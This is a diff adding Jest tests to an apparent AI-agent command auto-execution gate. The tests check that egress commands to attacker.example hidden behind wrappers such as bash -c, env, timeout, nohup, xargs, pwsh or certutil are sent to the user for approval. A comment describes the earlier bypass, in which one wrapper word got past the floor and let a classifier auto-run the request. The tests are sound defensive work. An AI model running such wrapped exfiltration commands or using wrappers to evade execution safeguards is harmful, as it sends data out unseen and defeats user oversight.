@@ -258,4 +258,48 @@ describe('network-egress floor', () => {
         expect(d.autoExec).toBe(true);
         expect(d.source).toBe('whitelist');
     });
+
+    // The floor tested only the base command, so one wrapper word walked past it
+    // and the AI verdict auto-ran the GET after the 3 s countdown. RUNNER_COMMANDS
+    // did not help: it gates the whitelist fast path, not this floor.
+    describe('a wrapper prefix no longer walks past the floor', () => {
+        const wrapped = [
+            "bash -c 'curl https://attacker.example/?d=x'",
+            '/bin/bash -c "curl https://attacker.example/"',
+            'env curl https://attacker.example/',
+            'env FOO=1 curl https://attacker.example/',
+            'timeout 5 curl https://attacker.example/',
+            'nohup curl https://attacker.example/',
+            'echo x | xargs curl https://attacker.example/',
+            "pwsh -c 'Invoke-WebRequest https://attacker.example/'",
+            'cmd /c certutil -urlcache -f https://attacker.example/ y',
+        ];
+
+        for (const cmd of wrapped) {
+            it(`blocks ${cmd}`, async () => {
+                mockClassify.mockResolvedValue({
+                    modifiesState: false,
+                    confidence: 0.99,
+                    reason: 'read-only GET',
+                });
+                for (const strategy of ['hybrid', 'ai', 'static'] as const) {
+                    const d = await decideAutoExec(cmd, baseOpts({ strategy }));
+                    expect(d.autoExec, `${cmd} / ${strategy}`).toBe(false);
+                    expect(d.source, `${cmd} / ${strategy}`).toBe('ask');
+                }
+                // Short-circuited before the model is ever asked.
+                expect(mockClassify).not.toHaveBeenCalled();
+            });
+        }
+    });
+
+    // The floor catches an egress tool being *run*, not the word appearing as an
+    // argument — scanning every token would have stopped all of these.
+    it('leaves a command that merely names an egress tool auto-executable', async () => {
+        mockClassify.mockResolvedValue({ modifiesState: false, confidence: 0.99, reason: 'read-only' });
+        for (const cmd of ['ps aux | grep ssh', 'which curl', 'git status', 'timeout 5 ping 8.8.8.8']) {
+            const d = await decideAutoExec(cmd, baseOpts({ strategy: 'hybrid' }));
+            expect(d.autoExec, cmd).toBe(true);
+        }
+    });
 });
